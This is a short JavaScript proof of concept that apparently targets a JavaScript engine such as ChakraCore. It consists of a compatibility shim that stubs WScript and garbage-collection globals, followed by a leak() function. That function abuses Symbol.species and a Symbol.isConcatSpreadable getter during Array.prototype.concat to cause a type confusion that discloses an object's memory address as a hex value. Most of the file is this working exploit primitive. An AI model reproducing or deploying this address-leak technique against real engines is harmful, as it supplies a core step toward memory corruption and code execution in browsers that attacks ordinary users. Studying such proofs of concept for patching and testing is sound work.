function gc() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
}

WScript = {
    _jscGC: gc,
    _jscPrint: console.log,
    _convertPathname : function(dosStylePath)
    {
        return dosStylePath.replace(/\\/g, "/");
    },
    Arguments : [ "summary" ],
    Echo : function()
    {
        WScript._jscPrint.apply(this, arguments);
    },
    LoadScriptFile : function(path)
    {
    },
    Quit : function()
    {
    },
    Platform :
    {
        "BUILD_TYPE": "Debug"
    }
};

function CollectGarbage()
{
    WScript._jscGC();
}

function $ERROR(e)
{
}

if (typeof(console) == "undefined") {
    console = {
        log: print
    };
}

if (typeof(gc) == "undefined") {
  gc = function() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
  }
}

if (typeof(BigInt) == "undefined") {
  BigInt = function (v) { return new Number(v); }
}

if (typeof(BigInt64Array) == "undefined") {
  BigInt64Array = function(v) { return new Array(v); }
}

if (typeof(BigUint64Array) == "undefined") { 
  BigUint64Array = function (v) { return new Array(v); }
}

if (typeof(quit) == "undefined") {
  quit = function() {
  }
}

function convert(data) {
  a = new ArrayBuffer(8);
  b = new Float64Array(a);
  c = new Uint8Array(a);
  b[0] = data;
  ret = 0;

  for (i = 0; i < 8; i++) {
    ret += c[7 - i].toString(16);
  }

  return ret;
}

function leak(target) {
  var a1 = [];

  for (var i = 0; i < 0x100; i++) {
    a1[i] = i;
  }

  var a2 = [1234, 1234];
  var c = new Function();

  c[Symbol.species] = function () {
    new_array = [99, 99, 99];
    return new_array;
  };

  a1.constructor = c;

  a2.__defineGetter__(Symbol.isConcatSpreadable, function () {
    new_array[0] = 4.2;
    a2[0] = target;
    return true;
  });

  var res = a1.concat(a2);
  return convert(res[256]);
}

a = [1, 2, 3];
v = leak(a);
console.log(v);
